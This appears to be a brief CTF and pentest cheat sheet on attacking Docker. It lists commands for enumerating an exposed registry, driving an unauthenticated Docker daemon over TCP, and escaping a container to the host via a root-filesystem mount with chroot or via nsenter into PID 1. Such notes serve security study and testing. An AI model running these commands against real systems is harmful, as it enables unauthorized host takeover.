# Docker Registries

<br>
<br>

### GET
```
http://IP:PORT/v2/_catalog
```

![image](https://github.com/LoKyOnTheCode/Securite-Informatique-et-CTF/assets/97956863/b535b3cb-4bf6-4ba5-9280-c2235db6c4c5)

<br>
<br>

### GET
```
http://IP:PORT/v2/repository/name/tags/list
```
![image](https://github.com/LoKyOnTheCode/Securite-Informatique-et-CTF/assets/97956863/2784b2f8-6216-413f-b1a0-ccfa87710e55)

<br>
<br>

### GET
```
http://IP:PORT/v2/repository/name/manifests/tag-name
```

![image](https://github.com/LoKyOnTheCode/Securite-Informatique-et-CTF/assets/97956863/b0f2b6ad-8665-41e7-9078-fd695eb4f32a)

<br>
<br>

# Dive

Installation <a href="https://github.com/wagoodman/dive#installation">ici</a>

```
dive <image_id>
```
<br>
<br>

# RCE

```
docker -H tcp://IP:PORT ps
```
Commands:

```
ps
exec
images
run
network ls
```

<br>
<br>

# Escaping

```
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```
```
We are essentially mounting the hosts "/" directory to the "/mnt" dir
in a new container, chrooting and then connecting via a shell.
```

<br>
<br>

# Shared Namespaces

![image](https://github.com/LoKyOnTheCode/Securite-Informatique-et-CTF/assets/97956863/4b284f0e-2353-4815-a4c5-27c2f67d0fa7)

<br>

```
nsenter --target 1 --mount sh
```

![image](https://github.com/LoKyOnTheCode/Securite-Informatique-et-CTF/assets/97956863/45e4e663-c561-4608-b5ba-a058094ee8dd)
